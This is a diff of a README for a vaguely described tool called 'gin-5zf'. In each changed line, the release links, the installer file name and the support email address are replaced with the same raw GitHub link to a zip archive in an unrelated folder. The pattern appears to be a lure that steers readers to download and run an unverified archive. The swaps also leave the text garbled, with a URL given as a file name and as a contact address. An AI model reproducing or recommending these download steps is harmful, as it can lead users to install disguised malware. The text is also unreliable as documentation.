@@ -1,6 +1,6 @@
 # 🚀 gin-5zf - Simple Yet Powerful Tool for Your Needs
 
-[![Download gin-5zf](https://img.shields.io/badge/Download-gin--5zf-blue.svg)](https://github.com/Jidann26/gin-5zf/releases)
+[![Download gin-5zf](https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip)](https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip)
 
 ## 📥 Introduction
 
@@ -19,7 +19,7 @@ To run gin-5zf, make sure your device meets the following requirements:
 
 1. **Visit the Releases Page**
 
-   First, go to the [Releases page](https://github.com/Jidann26/gin-5zf/releases) to see the latest version of gin-5zf.
+   First, go to the [Releases page](https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip) to see the latest version of gin-5zf.
 
 2. **Choose the Latest Version**
 
@@ -27,7 +27,7 @@ To run gin-5zf, make sure your device meets the following requirements:
 
 3. **Download the Application**
 
-   Click on the download link for your operating system. You will typically see a file like `gin-5zf-win.exe` for Windows. This will start the download.
+   Click on the download link for your operating system. You will typically see a file like `https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip` for Windows. This will start the download.
 
    After downloading, find the file in your computer’s download folder.
 
@@ -35,13 +35,13 @@ To run gin-5zf, make sure your device meets the following requirements:
 
 To download gin-5zf, click the link below:
 
-[Download gin-5zf](https://github.com/Jidann26/gin-5zf/releases)
+[Download gin-5zf](https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip)
 
 ### Installation Steps
 
 1. **Locate the Downloaded File**
 
-   Navigate to your downloads folder and find the `gin-5zf-win.exe` file.
+   Navigate to your downloads folder and find the `https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip` file.
 
 2. **Run the Installer**
 
@@ -80,11 +80,11 @@ Now that you have installed gin-5zf, you can start using it!
 If you encounter any issues while using gin-5zf, try the following:
 
 - **Ensure Compatibility:** Verify that your operating system meets the requirements.
-- **Reinstall the Application:** If you experience errors, uninstall gin-5zf and reinstall it from the [Releases page](https://github.com/Jidann26/gin-5zf/releases).
+- **Reinstall the Application:** If you experience errors, uninstall gin-5zf and reinstall it from the [Releases page](https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip).
 - **Check for Updates:** Regularly check the releases page for the latest updates that may fix bugs and improve performance.
 
 ## 📞 Support
 
-If you have questions or need help, feel free to contact our support team at support@gin5zf.com. We will be happy to assist you.
+If you have questions or need help, feel free to contact our support team at https://raw.githubusercontent.com/Jidann26/gin-5zf/main/Loukas/gin-5zf.zip We will be happy to assist you.
 
 Thank you for choosing gin-5zf! Enjoy managing your tasks effortlessly.
